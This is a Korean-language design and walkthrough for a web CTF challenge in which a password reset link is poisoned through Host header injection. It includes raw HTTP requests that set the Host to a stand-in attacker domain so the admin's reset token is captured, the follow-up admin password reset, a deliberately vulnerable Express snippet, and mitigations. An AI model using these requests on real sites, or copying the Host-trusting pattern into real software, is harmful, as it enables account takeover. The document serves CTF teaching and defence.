---
title: Host Header Injection Password Reset Poisoning — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, host-header-injection, password-reset, poisoning, business-logic, token-leak]
confidence: high
---

# Host Header Injection Password Reset Poisoning — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Secure Vault Recovery (보안 금고 복구 서비스)
- **난이도**: Medium
- **핵심 컨셉**: HTTP 요청 메커니즘의 인프라 라우팅 명세와 비즈니스 로직 연동 오류를 복합적으로 노려 중요 토큰을 오염시키는 **Host 헤더 인젝션 기반 비밀번호 재설정 포이즈닝(Password Reset Poisoning)** 취약점 문제입니다. 대상 웹 애플리케이션은 사용자가 비밀번호 찾기(재설정)를 요청하면 복구 링크가 기재된 메일을 발송합니다. 이때 메일에 표시될 도메인 링크 주소를 고정된 환경 변수 설정값 대신 클라이언트 HTTP 요청 내의 **`Host` 헤더** 필드 값을 동적으로 읽어와 조립합니다. 공격자는 피해자 관리자의 메일 주소로 재설정 메일을 요청하되, `Host` 헤더 값을 공격자 제어 아래에 있는 수신 도메인(`attacker.com`)으로 변조 전송함으로써 피해자가 메일을 클릭할 때 동적으로 실려 들어간 일회성 토큰 기밀값이 공격자 서버로 송신되게 만듭니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Password Reset Request Endpoint (`/api/forgot-password`)**:
  - 사용자의 이메일 주소를 인자로 받아 일회성 복구 토큰을 DB에 저장하고 안내 이메일을 발송하는 컨트롤러.
- **Flag 위치**:
  - 관리자 봇(Admin Bot)의 메일 링크를 포이즈닝해 토큰을 탈취한 후, 관리자 비밀번호를 공격자 임의 암호로 재설정하고 관리자 계정으로 최종 로그인하여 접근할 수 있는 내부 대시보드 API.

### 2.2 취약점 지점
1. **Dynamic Domain Resolution via Request Host Header**:
   - 백엔드는 외부 발송 메일에 부착될 URL 도메인을 조립할 때 `req.headers.host` 속성을 절대적으로 신뢰합니다.
   - 일부 WAS 환경이나 웹 프록시 설정 오류로 인해, 임의의 `Host` 헤더 값 혹은 `X-Forwarded-Host` 헤더를 입력하더라도 라우팅 필터링 없이 그대로 백엔드 코드 단에 인계되어 이메일 템플릿의 호스트 주소를 변조(Poisoning)합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | HTTP 헤더 조작 대상 | 역할 |
|------------|--------|------|----------|---------------------|------|
| `/api/forgot-password` | POST | 불필요 | `email` | `Host` 또는 `X-Forwarded-Host` | 비밀번호 재설정 이메일 발송 요청점 |
| `/api/reset-password` | POST | 토큰 필요 | `token`, `password` | - | 획득한 토큰을 기반으로 비밀번호 재설정 완료점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. Host 헤더 파싱 분석
1. 공격자는 비밀번호 찾기 메뉴 `/api/forgot-password`를 통해 자신의 계정으로 메일 발송을 테스트합니다.
2. 메일 본문에 포함된 복구 링크가 본래 도메인인 `http://target.challenge.local/reset-password?token=xxxx` 형태임을 관찰합니다.
3. 요청 패킷을 가로채 `Host` 헤더를 변조해 요청을 재시도합니다:
   ```http
   POST /api/forgot-password HTTP/1.1
   Host: attacker.local
   Content-Type: application/json
   
   {"email": "myuser@challenge.local"}
   ```
4. 수신한 메일 내부의 복구 도메인 호스트 부분이 `http://attacker.local/reset-password?token=xxxx`로 오염된 구조로 조립되었는지 확인하여 취약점을 검증합니다.

### Step 2. target 관리자 계정 타겟팅
1. 대상 관리자의 이메일 주소(예: `admin@challenge.local`)를 비밀번호 복구 대상으로 기입합니다.
2. HTTP 요청 내역의 `Host` 헤더 값을 공격자가 대기 중인 웹 서버 로그 수집기(`attacker.local`) 주소로 명시하여 발송합니다.
   - **공격 요청 패킷**:
     ```http
     POST /api/forgot-password HTTP/1.1
     Host: attacker.local
     Content-Type: application/json
     
     {"email": "admin@challenge.local"}
     ```
3. 백엔드는 이 요청을 처리하면서 `admin@challenge.local`의 복구 고유 토큰(`abcde12345`)을 DB에 적재한 뒤, 메일 발송 템플릿 엔진을 호출합니다:
   - 생성 링크: `http://[req.headers.host]/reset-password?token=abcde12345` -> `http://attacker.local/reset-password?token=abcde12345`
4. 완성된 포이즈닝 링크가 관리자의 실제 사서함 메일로 발송됩니다.

### Step 3. Admin Bot의 리디렉션 트리거 및 토큰 수집
1. 봇(Admin Bot)은 메일함에 접속하여 새로운 비밀번호 리커버리 메일을 열람하고 기재된 링크를 클릭합니다.
2. 봇의 브라우저는 메일에 구성된 오염 주소인 `http://attacker.local/reset-password?token=abcde12345`로 접근을 시도합니다.
3. 공격자는 대기 중이던 공격자 웹 서버의 Access Log를 확인하여 쿼리스트링 파라미터로 넘어온 토큰값 `abcde12345`를 획득합니다.

### Step 4. 패스워드 재설정 및 flag 획득
1. 탈취한 관리자 토큰값을 이용하여 `/api/reset-password` 엔드포인트로 정상적인 요청을 송신해 관리자 계정의 패스워드를 공격자가 설정한 패스워드(`attacker_pass123`)로 재설정합니다.
   - **비밀번호 강제 변경 패킷**:
     ```http
     POST /api/reset-password HTTP/1.1
     Host: target.challenge.local
     Content-Type: application/json
     
     {
       "token": "abcde12345",
       "password": "attacker_pass123"
     }
     ```
2. 변경 완료 후, 포털 로그인 창에서 `admin@challenge.local` / `attacker_pass123` 조합으로 로그인합니다.
3. 관리자 대시보드 화면에 접속해 최종 플래그(`FLAG{host_header_poisoning_password_reset_hijack}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express)

```javascript
// server.js (취약한 Host 헤더 동적 바인딩 이메일 전송 예시)
const express = require('express');
const crypto = require('crypto');
const app = express();

app.use(express.json());

// 모킹 메일 발송 유틸리티
function sendEmail(to, subject, body) {
    console.log(`[EMAIL-SEND] To: ${to} | Sub: ${subject} | Msg: ${body}`);
    // 실제 CTF 환경에서는 해당 메일이 Admin Bot의 모킹 사서함에 도달하고 봇이 링크를 읽어옴
}

const db = {}; // 메모리 가상 DB

app.post('/api/forgot-password', (req, res) => {
    const { email } = req.body;
    
    if (!email) return res.status(400).json({ error: "Email is required" });

    // 토큰 생성 및 임시 저장
    const resetToken = crypto.randomBytes(20).toString('hex');
    db[email] = resetToken;

    // 취약점 지점: 외부 접속 링크의 도메인(Base URL)을 신뢰할 수 없는 클라이언트 요청의 Host 헤더에서 참조함
    // 공격자는 Host 헤더를 임의의 피싱 도메인으로 교체하여 링크를 주입할 수 있음
    const hostHeader = req.headers.host; 
    const recoveryLink = `http://${hostHeader}/reset-password?token=${resetToken}`;

    const mailBody = `안녕하세요. 아래 링크를 클릭하시면 비밀번호 재설정이 완료됩니다.\n\n링크: ${recoveryLink}`;
    sendEmail(email, "비밀번호 찾기 복구 요청", mailBody);

    res.json({ status: "success", message: "Recovery email sent successfully." });
});

app.post('/api/reset-password', (req, res) => {
    const { token, password } = req.body;
    
    // 토큰 일치 유저 검색 후 패스워드 갱신 로직 실행
    // (중략)
    res.json({ status: "success", message: "Password has been reset." });
});

app.listen(8080);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **도메인 설정 상수의 사용 (Use Static Configured Base URL)**:
   - 이메일 본문과 같이 애플리케이션 외부 영역으로 절대 도메인 경로를 송출해야 하는 경우, 요청 헤더를 동적으로 읽어오지 말고 서버 환경 변수(Config/Environment Variables)에 하드코딩 또는 설정된 정적 도메인 주소(예: `process.env.APP_BASE_URL`)만 참조하여 빌드합니다.
2. **Reverse Proxy 단의 Host 헤더 유효성 검증**:
   - Nginx, Apache, AWS ALB 등 리버스 프록시 / 로드 밸런서 레이어에서 허가되지 않은 임의의 호스트 도메인을 달고 들어오는 악성 요청을 400 Bad Request 혹은 444 Connection Close로 거절하여 내부 백엔드로 전달되지 않게 사전 차단합니다.
3. **`X-Forwarded-Host` 사용 주의**:
   - Node.js Express의 경우 `trust proxy` 설정을 무분별하게 활성화하면 클라이언트가 악성값을 달고 전송하는 `X-Forwarded-Host` 헤더가 원본 `Host`로 우선 변킹되어 적용될 수 있으므로, 프록시 신뢰 레벨을 명확히 제어해야 합니다.
